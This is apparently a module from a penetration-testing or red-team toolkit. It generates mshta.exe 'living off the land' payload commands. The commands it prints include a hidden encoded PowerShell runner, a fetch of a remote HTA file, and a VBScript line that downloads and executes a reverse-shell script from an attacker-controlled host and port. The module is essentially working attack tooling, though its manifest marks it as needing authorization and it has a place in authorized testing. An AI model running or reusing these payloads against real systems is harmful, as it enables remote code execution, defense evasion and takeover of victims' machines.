"""mshta.exe LOLBin — HTA execution for payload delivery."""
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.lolbins.mshta.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["code_execution"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1218.005"],
}


def run(args: Any) -> int:
    lhost = getattr(args, "lhost", None)
    lport = getattr(args, "lport", "8080")
    payload_type = getattr(args, "hta_payload", "reverse_ps")

    payloads = {
        "reverse_ps": (
            'mshta.exe "javascript:var sh=new ActiveXObject(\'WScript.Shell\');'
            'sh.Run(\'powershell -nop -w hidden -enc {b64_cmd}\',0);close();"'
        ),
        "hta_url": 'mshta.exe http://{lhost}:{lport}/payload.hta',
        "inline_vbs": (
            'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run '
            '""powershell -ep bypass -w hidden IEX(New-Object Net.WebClient).'
            'downloadString(\'http://{lhost}:{lport}/rev.ps1\')"", 0:close")'
        ),
    }

    cmd = payloads.get(payload_type, payloads["hta_url"])
    cmd = cmd.format(lhost=lhost or "<LHOST>", lport=lport, b64_cmd="<B64_ENCODED>")

    print(f"[*] mshta.exe LOLBin ({payload_type}):")
    print(f"  {cmd}")
    print("\n[*] Available payloads: {}".format(", ".join(payloads.keys())))
    return 0
